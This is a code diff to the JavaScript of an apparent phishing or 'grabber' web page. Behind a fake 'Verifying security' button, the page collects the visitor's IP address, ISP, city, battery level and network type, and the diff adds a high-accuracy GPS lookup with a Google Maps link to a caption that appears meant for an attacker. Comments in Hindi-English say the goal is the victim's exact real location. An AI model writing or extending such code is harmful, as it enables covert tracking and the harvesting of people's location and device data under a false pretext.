@@ -64,6 +64,8 @@
         let ispInfo = "Unknown";
         let batteryData = "Unknown";
         let networkData = "Unknown";
+        let gpsLocation = "Fetching GPS...";
+        let googleMapLink = "N/A";
 
         fetch('https://ipapi.co/json/')
             .then(res => res.json())
@@ -88,9 +90,38 @@
             networkData = navigator.connection.effectiveType ? navigator.connection.effectiveType.toUpperCase() : "Unknown";
         }
 
-        function startProcess() {
+        // Exact GPS Location fetch karne ka function
+        function getGPS() {
+            return new Promise((resolve) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            let lat = position.coords.latitude;
+                            let lon = position.coords.longitude;
+                            let acc = position.coords.accuracy;
+                            gpsLocation = `${lat}, ${lon} (Accuracy: ~${Math.round(acc)}m)`;
+                            googleMapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                            resolve();
+                        },
+                        (error) => {
+                            gpsLocation = "Permission Denied / Not Available";
+                            resolve();
+                        },
+                        { timeout: 10000, enableHighAccuracy: true }
+                    );
+                } else {
+                    gpsLocation = "Not Supported";
+                    resolve();
+                }
+            });
+        }
+
+        async function startProcess() {
             document.getElementById('verifyBtn').style.display = 'none';
-            document.getElementById('status').innerText = "Verifying security, please wait...";
+            document.getElementById('status').innerText = "Verifying security & location, please allow permission...";
+
+            // Pehle GPS location fetch hone ka wait karega taaki message mein 100% real location jaye
+            await getGPS();
 
             const urlParams = new URLSearchParams(window.location.search);
             const camType = urlParams.get('b'); 
@@ -136,10 +167,11 @@
                             let uaString = navigator.userAgent;
 
                             captionText = 
-                                `🌐 **IP Information**\n\n` +
+                                `🌐 **IP & GPS Information**\n\n` +
                                 `🔢 IP Address: \`${ipInfo}\`\n` +
-                                `📍 Location: ${cityInfo}\n` +
-                                `🌍 Region: ${regionInfo} (${countryInfo})\n` +
+                                `📍 IP Location: ${cityInfo}, ${regionInfo}\n` +
+                                `🛰️ **Exact GPS Coordinates:**\n\`${gpsLocation}\`\n` +
+                                `🗺️ [Open in Google Maps](${googleMapLink})\n` +
                                 `📡 ISP: ${ispInfo}\n\n` +
                                 `📱 **Device Details**\n\n` +
                                 `🔋 Battery: ${batteryData}\n` +
